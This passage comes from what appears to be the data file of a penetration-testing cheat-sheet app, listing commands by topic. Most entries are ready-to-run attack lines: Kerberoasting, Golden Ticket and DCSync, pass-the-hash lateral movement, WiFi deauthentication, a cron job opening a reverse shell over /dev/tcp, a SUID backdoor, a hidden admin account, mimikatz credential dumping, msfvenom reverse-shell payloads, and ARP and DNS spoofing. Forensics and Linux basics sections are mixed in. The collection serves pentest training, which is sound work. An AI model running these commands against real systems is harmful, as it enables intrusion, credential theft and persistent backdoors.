          { cmd: "GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request", desc: 'Kerberoasting — request service tickets' },
          { cmd: 'hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack Kerberoast hash (TGS-REP)' },
          { cmd: 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack AS-REP hash' },
          { cmd: "ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> administrator", desc: 'Golden Ticket creation' },
          { cmd: "secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>", desc: 'DCSync — dump all domain hashes' },
        ],
      },
      {
        title: 'Lateral Movement',
        commands: [
          { cmd: "psexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>", desc: 'PsExec via Impacket' },
          { cmd: "wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>", desc: 'WMI Exec via Impacket' },
          { cmd: "evil-winrm -i <TARGET> -u <USER> -p <PASS>", desc: 'Evil-WinRM shell' },
          { cmd: "evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>", desc: 'Evil-WinRM Pass-the-Hash' },
          { cmd: 'crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH> -x "whoami"', desc: 'CrackMapExec Pass-the-Hash' },
          { cmd: 'xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /dynamic-resolution', desc: 'RDP connection' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 11. WIRELESS ATTACKS
  // ═══════════════════════════════════════════════
  {
    id: 'wireless',
    name: 'Wireless Attacks',
    icon: '📶',
    description: 'WiFi reconnaissance, WPA cracking, and evil twin attacks.',
    sections: [
      {
        title: 'WiFi Recon & Capture',
        commands: [
          { cmd: 'airmon-ng start wlan0', desc: 'Enable monitor mode' },
          { cmd: 'airodump-ng wlan0mon', desc: 'Scan for wireless networks' },
          { cmd: 'airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon', desc: 'Capture traffic on specific AP' },
          { cmd: 'aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon', desc: 'Deauthentication attack (force handshake)' },
          { cmd: 'aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt', desc: 'Crack WPA handshake' },
          { cmd: 'airmon-ng stop wlan0mon', desc: 'Disable monitor mode' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 12. POST-EXPLOITATION
  // ═══════════════════════════════════════════════
  {
    id: 'post-exploit',
    name: 'Post-Exploitation',
    icon: '🎯',
    description: 'Maintaining access, data exfiltration, and persistence.',
    sections: [
      {
        title: 'Persistence (Linux)',
        commands: [
          { cmd: 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\'" | crontab -', desc: 'Cron job reverse shell' },
          { cmd: 'echo "ssh-rsa <PUB_KEY>" >> ~/.ssh/authorized_keys', desc: 'SSH key persistence' },
          { cmd: 'cp /bin/bash /tmp/.hidden; chmod +s /tmp/.hidden', desc: 'SUID bash backdoor' },
        ],
      },
      {
        title: 'Persistence (Windows)',
        commands: [
          { cmd: 'schtasks /create /sc minute /mo 1 /tn "Update" /tr "C:\\Users\\Public\\rev.exe"', desc: 'Scheduled task persistence' },
          { cmd: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\Users\\Public\\rev.exe"', desc: 'Registry Run key persistence' },
          { cmd: 'net user backdoor Password123! /add && net localgroup Administrators backdoor /add', desc: 'Create hidden admin account' },
        ],
      },
      {
        title: 'Credential Harvesting',
        commands: [
          { cmd: 'mimikatz # sekurlsa::logonpasswords', desc: 'Dump plaintext passwords from memory' },
          { cmd: 'mimikatz # lsadump::sam', desc: 'Dump SAM database hashes' },
          { cmd: 'mimikatz # lsadump::dcsync /user:Administrator', desc: 'DCSync attack' },
          { cmd: 'cat /etc/shadow', desc: 'Linux password hashes' },
          { cmd: 'grep -r "password" /var/www/ 2>/dev/null', desc: 'Search for passwords in web files' },
          { cmd: 'find / -name "*.config" -exec grep -l "password" {} \\; 2>/dev/null', desc: 'Find config files with passwords' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 13. CRYPTOGRAPHY & STEGANOGRAPHY
  // ═══════════════════════════════════════════════
  {
    id: 'crypto',
    name: 'Cryptography & Stego',
    icon: '🔑',
    description: 'Encryption, decryption, encoding, and steganography techniques.',
    sections: [
      {
        title: 'Encoding / Decoding',
        commands: [
          { cmd: "echo -n 'text' | base64", desc: 'Base64 encode' },
          { cmd: "echo -n 'dGV4dA==' | base64 -d", desc: 'Base64 decode' },
          { cmd: "echo -n 'text' | xxd", desc: 'Hex dump' },
          { cmd: "echo -n 'text' | md5sum", desc: 'MD5 hash' },
          { cmd: "echo -n 'text' | sha256sum", desc: 'SHA-256 hash' },
          { cmd: "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc", desc: 'AES encrypt a file' },
          { cmd: "openssl enc -aes-256-cbc -d -in file.enc -out file.txt", desc: 'AES decrypt a file' },
        ],
      },
      {
        title: 'Steganography',
        commands: [
          { cmd: 'steghide extract -sf image.jpg', desc: 'Extract hidden data from image' },
          { cmd: 'steghide embed -cf image.jpg -ef secret.txt', desc: 'Hide data inside an image' },
          { cmd: 'binwalk image.png', desc: 'Analyze embedded files in binary' },
          { cmd: 'binwalk -e image.png', desc: 'Extract embedded files' },
          { cmd: 'strings image.jpg | head -50', desc: 'Extract readable strings from file' },
          { cmd: 'exiftool image.jpg', desc: 'View image metadata' },
          { cmd: 'zsteg image.png', desc: 'Detect LSB steganography in PNG' },
        ],
      },
    ],
  },
  {
    id: 'metasploit',
    name: 'Metasploit Framework',
    icon: '💀',
    description: 'The most powerful exploitation framework — from recon to post-exploitation.',
    sections: [
      {
        title: 'Core Navigation',
        commands: [
          { cmd: 'msfconsole', desc: 'Launch Metasploit console' },
          { cmd: 'msfdb init', desc: 'Initialize the Metasploit database' },
          { cmd: 'db_status', desc: 'Check database connection status' },
          { cmd: 'workspace -a <NAME>', desc: 'Create a new workspace' },
          { cmd: 'workspace', desc: 'List all workspaces' },
          { cmd: 'search <KEYWORD>', desc: 'Search for modules (exploits, payloads, etc.)' },
          { cmd: 'search type:exploit platform:windows <KEYWORD>', desc: 'Filtered module search' },
          { cmd: 'use <MODULE_PATH>', desc: 'Select a module' },
          { cmd: 'info', desc: 'Show detailed module information' },
          { cmd: 'show options', desc: 'View required/optional settings' },
          { cmd: 'show payloads', desc: 'List compatible payloads' },
          { cmd: 'show targets', desc: 'List available targets for exploit' },
          { cmd: 'set <OPTION> <VALUE>', desc: 'Set a module option' },
          { cmd: 'setg <OPTION> <VALUE>', desc: 'Set a global option (persists across modules)' },
          { cmd: 'run / exploit', desc: 'Execute the module' },
          { cmd: 'back', desc: 'Return to the main console' },
        ],
      },
      {
        title: 'Scanning & Recon Modules',
        commands: [
          { cmd: 'db_nmap -sV -sC <TARGET>', desc: 'Run Nmap and import results to DB' },
          { cmd: 'hosts', desc: 'List discovered hosts in DB' },
          { cmd: 'services', desc: 'List discovered services' },
          { cmd: 'vulns', desc: 'List discovered vulnerabilities' },
          { cmd: 'use auxiliary/scanner/portscan/tcp', desc: 'TCP port scanner module' },
          { cmd: 'use auxiliary/scanner/smb/smb_version', desc: 'Detect SMB version' },
          { cmd: 'use auxiliary/scanner/http/http_version', desc: 'HTTP server fingerprint' },
          { cmd: 'use auxiliary/scanner/ssh/ssh_login', desc: 'SSH brute-force module' },
          { cmd: 'use auxiliary/scanner/ftp/ftp_login', desc: 'FTP brute-force module' },
          { cmd: 'use auxiliary/scanner/smb/smb_login', desc: 'SMB brute-force module' },
        ],
      },
      {
        title: 'Common Exploits',
        commands: [
          { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', desc: 'EternalBlue (MS17-010)' },
          { cmd: 'use exploit/windows/smb/psexec', desc: 'PsExec pass-the-hash' },
          { cmd: 'use exploit/multi/handler', desc: 'Multi-handler (catch reverse shells)' },
          { cmd: 'use exploit/unix/ftp/vsftpd_234_backdoor', desc: 'VSFTPD 2.3.4 backdoor' },
          { cmd: 'use exploit/multi/http/tomcat_mgr_upload', desc: 'Tomcat manager WAR upload' },
          { cmd: 'use exploit/windows/http/rejetto_hfs_exec', desc: 'Rejetto HFS RCE' },
          { cmd: 'use exploit/linux/samba/is_known_pipename', desc: 'Samba RCE (CVE-2017-7494)' },
        ],
      },
      {
        title: 'Meterpreter Post-Exploitation',
        commands: [
          { cmd: 'sysinfo', desc: 'System information' },
          { cmd: 'getuid', desc: 'Current user identity' },
          { cmd: 'getsystem', desc: 'Attempt privilege escalation' },
          { cmd: 'hashdump', desc: 'Dump password hashes (SAM)' },
          { cmd: 'shell', desc: 'Drop into OS shell' },
          { cmd: 'upload <LOCAL> <REMOTE>', desc: 'Upload file to target' },
          { cmd: 'download <REMOTE> <LOCAL>', desc: 'Download file from target' },
          { cmd: 'screenshot', desc: 'Capture screenshot of desktop' },
          { cmd: 'keyscan_start / keyscan_dump', desc: 'Start/dump keylogger' },
          { cmd: 'webcam_snap', desc: 'Capture webcam image' },
          { cmd: 'ps', desc: 'List running processes' },
          { cmd: 'migrate <PID>', desc: 'Migrate to another process' },
          { cmd: 'run post/multi/recon/local_exploit_suggester', desc: 'Suggest local exploits' },
          { cmd: 'run autoroute -s <SUBNET>/24', desc: 'Add route through session for pivoting' },
          { cmd: 'portfwd add -l <LP> -p <RP> -r <TARGET>', desc: 'Port forward through Meterpreter' },
          { cmd: 'background', desc: 'Background the session' },
          { cmd: 'sessions -l', desc: 'List all active sessions' },
          { cmd: 'sessions -i <ID>', desc: 'Interact with a session' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 15. PAYLOAD GENERATION
  // ═══════════════════════════════════════════════
  {
    id: 'payloads',
    name: 'Payload Generation',
    icon: '🧬',
    description: 'Create custom payloads and shellcode with MSFVenom and other tools.',
    sections: [
      {
        title: 'MSFVenom — Linux Payloads',
        commands: [
          { cmd: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf', desc: 'Linux Meterpreter reverse shell (ELF)' },
          { cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf', desc: 'Linux x64 staged reverse shell' },
          { cmd: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf', desc: 'Linux x86 non-staged reverse shell' },
        ],
      },
      {
        title: 'MSFVenom — Windows Payloads',
        commands: [
          { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe', desc: 'Windows Meterpreter reverse shell (EXE)' },
          { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe', desc: 'Windows x64 Meterpreter (EXE)' },
          { cmd: 'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe', desc: 'Windows simple reverse shell (EXE)' },
          { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp', desc: 'ASP reverse shell (IIS servers)' },
          { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta', desc: 'HTA PowerShell delivery' },
          { cmd: 'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > setup.msi', desc: 'MSI installer payload (AlwaysInstallElevated)' },
        ],
      },
      {
        title: 'MSFVenom — Web Payloads',
        commands: [
          { cmd: 'msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php', desc: 'PHP Meterpreter reverse shell' },
          { cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war', desc: 'JSP WAR reverse shell (Tomcat)' },
          { cmd: 'msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.py', desc: 'Python Meterpreter' },
        ],
      },
      {
        title: 'MSFVenom — Shellcode & Encoding',
        commands: [
          { cmd: 'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c', desc: 'Generate C shellcode' },
          { cmd: 'msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f python', desc: 'Generate Python shellcode' },
          { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe', desc: 'Encoded payload (5 iterations)' },
          { cmd: 'msfvenom -l encoders', desc: 'List all available encoders' },
          { cmd: 'msfvenom -l payloads | grep <KEYWORD>', desc: 'Search available payloads' },
          { cmd: 'msfvenom -l formats', desc: 'List all output formats' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 16. FORENSICS & INCIDENT RESPONSE
  // ═══════════════════════════════════════════════
  {
    id: 'forensics',
    name: 'Forensics & IR',
    icon: '🔬',
    description: 'Disk imaging, memory analysis, log analysis, and incident response.',
    sections: [
      {
        title: 'Disk & File Analysis',
        commands: [
          { cmd: 'dd if=/dev/sda of=disk.img bs=4M status=progress', desc: 'Create forensic disk image' },
          { cmd: 'fdisk -l disk.img', desc: 'List partitions in disk image' },
          { cmd: 'mount -o loop,ro,offset=<OFFSET> disk.img /mnt/evidence', desc: 'Mount disk image read-only' },
          { cmd: 'file <FILE>', desc: 'Identify file type' },
          { cmd: 'xxd <FILE> | head', desc: 'Hex viewer' },
          { cmd: 'foremost -i disk.img -o recovered/', desc: 'Carve files from disk image' },
          { cmd: 'scalpel -c scalpel.conf -o output disk.img', desc: 'File carving with Scalpel' },
          { cmd: 'testdisk disk.img', desc: 'Recover lost partitions' },
          { cmd: 'photorec disk.img', desc: 'Recover deleted files' },
        ],
      },
      {
        title: 'Memory Forensics (Volatility)',
        commands: [
          { cmd: 'vol.py -f memory.dmp imageinfo', desc: 'Identify memory dump OS profile' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> pslist', desc: 'List running processes' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> pstree', desc: 'Process tree view' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> netscan', desc: 'Network connections' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> filescan', desc: 'Scan for file objects' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> dumpfiles -Q <OFFSET> -D dump/', desc: 'Dump file from memory' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> hashdump', desc: 'Dump password hashes from memory' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> cmdline', desc: 'Command line arguments of processes' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> malfind', desc: 'Find injected/malicious code' },
          { cmd: 'vol.py -f memory.dmp --profile=<PROFILE> hivelist', desc: 'List registry hives' },
        ],
      },
      {
        title: 'Log Analysis',
        commands: [
          { cmd: 'cat /var/log/auth.log | grep "Failed password"', desc: 'Find failed SSH login attempts' },
          { cmd: 'cat /var/log/auth.log | grep "Accepted password"', desc: 'Find successful logins' },
          { cmd: 'last -f /var/log/wtmp', desc: 'Show login history' },
          { cmd: 'lastb', desc: 'Show failed login attempts' },
          { cmd: 'cat /var/log/apache2/access.log | awk \'{print $1}\' | sort | uniq -c | sort -rn | head', desc: 'Top IPs hitting web server' },
          { cmd: 'journalctl -u sshd --since "1 hour ago"', desc: 'Recent SSH service logs (systemd)' },
          { cmd: 'wevtutil qe Security /f:text /c:50', desc: 'Windows: Query Security event log' },
          { cmd: 'Get-WinEvent -LogName Security -MaxEvents 100', desc: 'PowerShell: Recent security events' },
        ],
      },
      {
        title: 'Network Forensics',
        commands: [
          { cmd: 'tcpdump -i eth0 -w capture.pcap', desc: 'Capture network traffic' },
          { cmd: 'tcpdump -r capture.pcap -nn', desc: 'Read pcap file' },
          { cmd: 'tcpdump -r capture.pcap "tcp port 80" -A', desc: 'Filter HTTP traffic and show ASCII' },
          { cmd: 'tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri', desc: 'Extract HTTP requests from pcap' },
          { cmd: 'tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name', desc: 'Extract DNS queries' },
          { cmd: 'tshark -r capture.pcap -qz conv,tcp', desc: 'TCP conversation summary' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 17. NETWORK TRAFFIC ANALYSIS
  // ═══════════════════════════════════════════════
  {
    id: 'traffic',
    name: 'Network & MITM',
    icon: '🕸️',
    description: 'Packet sniffing, traffic interception, ARP spoofing, and MITM attacks.',
    sections: [
      {
        title: 'Packet Capture & Analysis',
        commands: [
          { cmd: 'tcpdump -i <INTERFACE> -nn -v', desc: 'Verbose packet capture' },
          { cmd: 'tcpdump -i <INTERFACE> "host <IP>"', desc: 'Capture traffic to/from specific host' },
          { cmd: 'tcpdump -i <INTERFACE> "port 443"', desc: 'Capture HTTPS traffic' },
          { cmd: 'tcpdump -i <INTERFACE> "not port 22" -w out.pcap', desc: 'Capture all except SSH, save to file' },
          { cmd: 'wireshark capture.pcap', desc: 'Open pcap in Wireshark GUI' },
          { cmd: 'tshark -i <INTERFACE> -f "tcp port 80"', desc: 'TShark live capture with filter' },
        ],
      },
      {
        title: 'ARP Spoofing & MITM',
        commands: [
          { cmd: 'arpspoof -i <INTERFACE> -t <VICTIM> <GATEWAY>', desc: 'ARP spoof victim (become gateway)' },
          { cmd: 'arpspoof -i <INTERFACE> -t <GATEWAY> <VICTIM>', desc: 'ARP spoof gateway (become victim)' },
          { cmd: 'echo 1 > /proc/sys/net/ipv4/ip_forward', desc: 'Enable IP forwarding (required for MITM)' },
          { cmd: 'ettercap -T -q -i <INTERFACE> -M arp:remote /<VICTIM>// /<GATEWAY>//', desc: 'Ettercap MITM attack' },
          { cmd: 'bettercap -iface <INTERFACE>', desc: 'Launch Bettercap MITM framework' },
          { cmd: 'bettercap > net.probe on; net.sniff on; arp.spoof on', desc: 'Bettercap ARP spoof + sniff' },
          { cmd: 'mitmproxy --mode transparent', desc: 'Transparent MITM proxy (intercept HTTPS)' },
          { cmd: 'responder -I <INTERFACE> -rdw', desc: 'LLMNR/NBT-NS/MDNS poisoner (capture NTLMv2 hashes)' },
        ],
      },
      {
        title: 'DNS Attacks',
        commands: [
          { cmd: 'dnschef --fakeip <ATTACKER_IP> --interface <INTERFACE>', desc: 'DNS proxy (redirect all queries)' },
          { cmd: 'bettercap > set dns.spoof.domains <DOMAIN>; dns.spoof on', desc: 'DNS spoofing with Bettercap' },
          { cmd: 'dnsmasq --address=/<DOMAIN>/<ATTACKER_IP>', desc: 'DNS redirect via dnsmasq' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 18. ESSENTIAL LINUX & BASH
  // ═══════════════════════════════════════════════
  {
    id: 'linux-essentials',
    name: 'Essential Linux & Bash',
    icon: '🖥️',
    description: 'Must-know Linux commands, bash scripting tricks, and system administration.',
    sections: [
      {
        title: 'File Operations & Navigation',
        commands: [
          { cmd: 'find / -name "*.txt" -type f 2>/dev/null', desc: 'Find files by name recursively' },
          { cmd: 'find / -user root -perm -4000 2>/dev/null', desc: 'Find SUID files owned by root' },
          { cmd: 'find / -mmin -30 -type f 2>/dev/null', desc: 'Files modified in last 30 minutes' },
          { cmd: 'find / -size +100M -type f 2>/dev/null', desc: 'Find files larger than 100MB' },
          { cmd: 'locate <FILENAME>', desc: 'Quickly find file by name (uses DB)' },
          { cmd: 'which <COMMAND>', desc: 'Find path of an executable' },
          { cmd: 'ls -la /tmp /var/tmp /dev/shm', desc: 'Check world-writable temp dirs' },
          { cmd: 'du -sh /var/log/*', desc: 'Check log file sizes' },
          { cmd: 'tar -czvf archive.tar.gz /path/to/dir', desc: 'Create compressed archive' },
          { cmd: 'tar -xzvf archive.tar.gz', desc: 'Extract compressed archive' },
          { cmd: 'unzip file.zip -d /output/', desc: 'Unzip to directory' },
        ],
      },
      {
        title: 'Text Processing & Grep',
        commands: [
          { cmd: 'grep -rn "password" /var/www/ 2>/dev/null', desc: 'Recursive search for "password" with line numbers' },
          { cmd: 'grep -i "error\\|fail\\|denied" /var/log/syslog', desc: 'Search for errors in syslog' },
          { cmd: 'grep -oP "\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b" file.txt', desc: 'Extract IP addresses from file' },
          { cmd: "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20", desc: 'Top 20 IPs from access log' },
          { cmd: "awk -F: '{print $1}' /etc/passwd", desc: 'Extract usernames from passwd' },
          { cmd: "sed 's/old/new/g' file.txt", desc: 'Find and replace text in file' },
          { cmd: "cut -d':' -f1,3 /etc/passwd", desc: 'Extract fields 1 and 3 from passwd' },
          { cmd: 'sort file.txt | uniq -c | sort -rn', desc: 'Count and sort unique occurrences' },
          { cmd: 'wc -l file.txt', desc: 'Count lines in file' },
          { cmd: 'diff file1.txt file2.txt', desc: 'Compare two files' },
          { cmd: 'tr "A-Z" "a-z" < input.txt', desc: 'Convert to lowercase' },
          { cmd: "cat file.txt | tr -d '\\n'", desc: 'Remove all newlines' },
        ],
      },
      {
        title: 'Users, Permissions & Processes',
        commands: [
          { cmd: 'chmod 777 file', desc: 'Full permissions (rwxrwxrwx)' },
          { cmd: 'chmod +x script.sh', desc: 'Make file executable' },
          { cmd: 'chown user:group file', desc: 'Change file ownership' },
          { cmd: 'passwd <USER>', desc: 'Change user password' },
          { cmd: 'useradd -m -s /bin/bash <USER>', desc: 'Create new user with home dir' },
          { cmd: 'usermod -aG sudo <USER>', desc: 'Add user to sudo group' },
          { cmd: 'kill -9 <PID>', desc: 'Force kill a process' },
          { cmd: 'pkill -f <PROCESS_NAME>', desc: 'Kill process by name' },
          { cmd: 'nohup <COMMAND> &', desc: 'Run command in background (survives logout)' },
          { cmd: 'screen -S session1', desc: 'Create named screen session' },
          { cmd: 'tmux new -s work', desc: 'Create named tmux session' },
        ],
      },
      {
        title: 'Networking Commands',
        commands: [
          { cmd: 'ip a / ifconfig', desc: 'View network interfaces' },
          { cmd: 'ip route / route -n', desc: 'View routing table' },
          { cmd: 'ss -tulnp / netstat -tulnp', desc: 'Show listening ports with PIDs' },
          { cmd: 'ping -c 4 <HOST>', desc: 'Test host connectivity' },
          { cmd: 'traceroute <HOST>', desc: 'Trace packet path to host' },
          { cmd: 'curl -I <URL>', desc: 'Get HTTP headers only' },
          { cmd: 'curl -s <URL> | head', desc: 'Quick web page preview' },
          { cmd: 'wget -r -np <URL>', desc: 'Recursively download website' },
          { cmd: 'iptables -L -n -v', desc: 'List firewall rules' },
          { cmd: 'iptables -A INPUT -p tcp --dport <PORT> -j ACCEPT', desc: 'Allow incoming port' },
          { cmd: 'ssh-keygen -t rsa -b 4096', desc: 'Generate SSH key pair' },
          { cmd: 'ssh -i key.pem <USER>@<HOST>', desc: 'SSH with private key' },
        ],
      },
      {
        title: 'Bash One-Liners & Scripting',
        commands: [
          { cmd: 'for i in $(seq 1 254); do ping -c 1 -W 1 10.10.10.$i &>/dev/null && echo "10.10.10.$i is up"; done', desc: 'Bash ping sweep' },
          { cmd: 'for port in $(seq 1 65535); do (echo >/dev/tcp/<TARGET>/$port) &>/dev/null && echo "$port open"; done', desc: 'Bash port scanner' },
          { cmd: 'while read line; do echo $line; done < file.txt', desc: 'Read file line by line' },
          { cmd: 'cat urls.txt | while read url; do curl -s -o /dev/null -w "%{http_code} $url\\n" $url; done', desc: 'Check HTTP status of URLs from file' },
          { cmd: "echo 'compromised' | base64 | rev", desc: 'Obfuscate string (base64 + reverse)' },
          { cmd: 'date +%Y%m%d_%H%M%S', desc: 'Timestamp for filenames' },
          { cmd: 'watch -n 5 "netstat -tulnp"', desc: 'Monitor ports every 5 seconds' },
          { cmd: 'alias ll="ls -la"', desc: 'Create command alias' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 19. EXPLOIT DEVELOPMENT & REVERSE ENGINEERING
  // ═══════════════════════════════════════════════
  {
    id: 'exploit-dev',
    name: 'Exploit Dev & RE',
    icon: '🏗️',
    description: 'Binary analysis, shellcode development, and exploit prototyping.',
    sections: [
      {
        title: 'GDB-peda / Pwndbg',
        commands: [
          { cmd: 'gdb <BINARY>', desc: 'Start debugger' },
          { cmd: 'checksec', desc: 'Check binary protections (NX, PIE, Canary, ASLR)' },
          { cmd: 'pattern create <SIZE>', desc: 'Create cyclic pattern for buffer overflow' },
          { cmd: 'pattern offset <HEX_VALUE>', desc: 'Find offset of value in cyclic pattern' },
          { cmd: 'elfheader', desc: 'Display ELF header information' },
          { cmd: 'vmmap', desc: 'Display virtual memory mapping' },
          { cmd: 'find "/bin/sh"', desc: 'Search for string in memory' },
          { cmd: 'ropgadget', desc: 'List available ROP gadgets' },
          { cmd: 'run $(python3 -c "print(\'A\'*100)")', desc: 'Run with basic overflow input' },
          { cmd: 'x/50x $esp', desc: 'Examine stack memory (hex)' },
          { cmd: 'disas main', desc: 'Disassemble main function' },
        ],
      },
      {
        title: 'Pwntools — Python Exploit Framework',
        commands: [
          { cmd: 'from pwn import *', desc: 'Standard pwntools import' },
          { cmd: 'p = process("./binary")', desc: 'Start local binary process' },
          { cmd: 'r = remote("<IP>", <PORT>)', desc: 'Connect to remote service' },
          { cmd: "p.sendline(b'A' * offset + p32(target_attr))", desc: 'Send overflow payload (32-bit)' },
          { cmd: "p.sendline(b'A' * offset + p64(target_attr))", desc: 'Send overflow payload (64-bit)' },
          { cmd: 'p.interactive()', desc: 'Drop to interactive shell' },
          { cmd: 'cyclic(512)', desc: 'Generate pattern in script' },
          { cmd: 'p32(0xdeadbeef)', desc: 'Pack integer to little-endian bytes' },
        ],
      },
      {
        title: 'Ghidra & IDA Shortcuts',
        commands: [
          { cmd: 'Ghidra: G', desc: 'Go to address' },
          { cmd: 'Ghidra: L', desc: 'Rename variable' },
          { cmd: 'Ghidra: Ctrl + E', desc: 'Edit function signature' },
          { cmd: 'IDA: F5', desc: 'Decompile current function' },
          { cmd: 'IDA: X', desc: 'List cross-references' },
          { cmd: 'IDA: N', desc: 'Rename element' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 20. API PENTESTING
  // ═══════════════════════════════════════════════
  {
    id: 'api-pentest',
    name: 'API Pentesting',
    icon: '🔌',
    description: 'Intercepting and manipulating REST, GraphQL, and SOAP interfaces.',
    sections: [
      {
        title: 'GraphQL Attacks',
        commands: [
          { cmd: '{"query": "{__schema{types{name}}}"}', desc: 'Basic GraphQL introspection' },
          { cmd: '{"query": "{__type(name: \\"Query\\"){fields{name}}}"}', desc: 'List available GraphQL queries' },
          { cmd: 'graphql-path-enum -u <URL>', desc: 'Find hidden GraphQL endpoints' },
          { cmd: 'nmap -p 80,443 --script http-graphql-introspection <TARGET>', desc: 'Check for introspection via Nmap' },
        ],
      },
      {
        title: 'JWT Manipulation',
        commands: [
          { cmd: '{"alg":"none"}', desc: 'JWT none algorithm attack' },
          { cmd: '{"alg":"HS256"} ... key = publicKey', desc: 'Key confusion attack (RS256 to HS256)' },
          { cmd: 'jwt_tool <TOKEN> -I -pc <CLAIM> -pv <VAL>', desc: 'Modify JWT claim with jwt_tool' },
          { cmd: 'jwt_tool <TOKEN> -C -d <DICT>', desc: 'Brute-force/crack JWT HMAC secret' },
        ],
      },
      {
        title: 'API Fuzzing & Tools',
        commands: [
          { cmd: 'ffuf -w wordlist.txt -u <URL>/api/v1/FUZZ', desc: 'Enumerate API endpoints' },
          { cmd: 'arjun -u <URL> -m GET', desc: 'Discover hidden URL parameters' },
          { cmd: 'kiterunner scan <URL>', desc: 'High-performance API discovery' },
          { cmd: 'postman -i <SWAGGER_URL>', desc: 'Import swagger to Postman' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 21. CLOUD SECURITY — AWS
  // ═══════════════════════════════════════════════
  {
    id: 'cloud-aws',
    name: 'Cloud: AWS',
    icon: '☁️',
    description: 'Relentless enumeration and exploitation of Amazon Web Services infrastructure.',
    sections: [
      {
        title: 'Initial Enumeration',
        commands: [
          { cmd: 'aws configure', desc: 'Set up AWS CLI credentials' },
          { cmd: 'aws sts get-caller-identity', desc: 'Identify current user/role ARN' },
          { cmd: 'aws iam list-users', desc: 'List all IAM users' },
          { cmd: 'aws s3 ls', desc: 'List all S3 buckets' },
          { cmd: 'aws ec2 describe-instances', desc: 'Enumerate EC2 instances' },
          { cmd: 'aws lambda list-functions', desc: 'List all Lambda functions' },
          { cmd: 'curl http://169.254.169.254/latest/meta-data/', desc: 'IMDSv1 metadata access (SSRF)' },
        ],
      },
      {
        title: 'S3 & IAM Exploitation',
        commands: [
          { cmd: 'aws s3 ls s3://<BUCKET> --no-sign-request', desc: 'Check for public S3 bucket access' },
          { cmd: 'aws s3 cp file.txt s3://<BUCKET>/', desc: 'Upload file to S3 bucket' },
          { cmd: 'aws iam list-attached-user-policies --user-name <USER>', desc: 'Retrieve users effective permissions' },
          { cmd: 'aws iam get-policy-version --policy-arn <ARN> --version-id <ID>', desc: 'Examine IAM policy document' },
          { cmd: 'pacu', desc: 'Launch PACU (AWS exploitation framework)' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 22. CLOUD SECURITY — AZURE & GCP
  // ═══════════════════════════════════════════════
  {
    id: 'cloud-azure-gcp',
    name: 'Cloud: Azure/GCP',
    icon: '⛅',
    description: 'Focused exploitation of Microsoft Azure and Google Cloud ecosystems.',
    sections: [
      {
